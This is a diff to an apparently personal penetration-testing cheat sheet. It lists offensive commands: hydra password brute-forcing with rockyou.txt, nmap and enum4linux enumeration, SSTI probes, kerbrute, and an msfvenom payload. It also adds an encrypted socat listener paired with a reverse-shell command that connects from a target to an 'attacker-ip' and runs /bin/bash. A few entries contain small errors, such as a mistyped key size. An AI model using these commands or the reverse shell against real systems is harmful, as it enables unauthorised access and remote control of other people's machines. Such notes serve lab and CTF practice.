@@ -1,11 +1,20 @@
-#ssh
-hydra -l username -P passwordslist ssh://ip  ~bruteforce credintials
+#ssh login
+mv private ~/ssh
+mv public.pub ~/ssh
+cd .ssh
+chmod 600 private
+get username at the bottom of public.pub
+ssh username@ip
+
+#hydra brute-forcing service login
+hydra -t 4 -l username -P rockyou.txt -vV SERVICE://IP -t 4 > thread
 
 #http
 dirb http://ip  ~bruteforce directories
 nikto -host http://ip  ~web app vulnerbility scanning
 
 #smb
+enum4linux -a IP
 smbclient -L //ip/ -U anonymous  ~list shares using anonymous login
 smbclient //ip/share  ~access a share
 
@@ -23,16 +32,16 @@ searchsploit KEYWORD  ~ search an exploit for a service
 nmap -sV -sC -p- -T4 ip  ~Once and for all :)
 nmap -sV -sC -p- -T4 -Pn ip  ~for windows machines
 nmap --script vuln -p port ip  ~find exploits related to service
+nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 [IP] ~scan with proxies
 
 #privesc
 [Linux]
 uname -a  ~get kernel version
 sudo -l  ~what files can be used with sudo
 /bin/sh -i  ~spawning a shell
-[Windows]
 
 #ssti
-${7*7} OR {{7*7}}  ~test if website is vulnerable to ssti
+${7*7} [OR] {{7*7}}  ~test if website is vulnerable to ssti
 
 #verify RCE
 whoami  ~get username on both windows and linux
@@ -44,3 +53,32 @@ kerbrute [mode] -d [dns domain name] --dc [domain controller]
 
 #routing and pivoting
 sudo ip route add [10][192].0.0.0/[8][24] via [gateway ip]
+
+#creating a key and cert with openssl
+openssl req -x509 -newkey rsa:4096 -days 365 -subj '/O=anyname' -nodes -keyout privatekey.key -out certificate.crt
+req > certificate signing
+-x509 > x.509 certificate
+-newkey rsa:4069 > key size is 4096 bits
+-days 365 > validity of certificate
+-subj > sets data
+-nodes > do not encrypt private key
+-keyout privatekey.key > store private key in file
+-out certificate.crt > store certificate in file
+
+#creating pem file with cert and private key file
+openssl pkcs12 -export -in <certificate_file> -inkey <private_key_file> -out <output_file>.pem
+
+#listener with socat using openssl encryption
+socat OPENSSL-LISTEN:4443,cert=pemfile.pem,verify=0,fork STDOUT
+
+#connect from target machine with socat using openssl encryption
+socat OPENSSL:attacker-ip:listener-port,verify=0 EXEC:/bin/bash
+
+#creating a listener payloud with msfvenom
+msfvenom -p path/to/payload lhost=IP lport=PORT R > file
+
+#NFS (network file system)
+list shares:
+/usr/sbin/showmount -e IP
+mount directory to your /tmp/mount:
+sudo mount -t nfs IP:directory /tmp/mount/ -nolock
